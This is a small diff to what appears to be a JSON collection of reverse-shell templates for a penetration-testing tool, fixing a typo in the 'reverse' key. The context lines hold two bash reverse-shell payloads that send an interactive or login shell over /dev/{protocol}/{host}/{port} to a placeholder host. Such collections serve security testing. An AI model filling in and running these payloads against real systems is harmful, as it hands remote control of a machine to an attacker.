@@ -1,5 +1,5 @@
 {
-  "reverse"": {
+  "reverse": {
     "bash": {
       "Bash-i": "{shell_path} -i >& /dev/{protocol}/{host}/{port} 0>&1",
       "Bash-l": "{shell_path} -l >& /dev/{protocol}/{host}/{port} 0>&1",
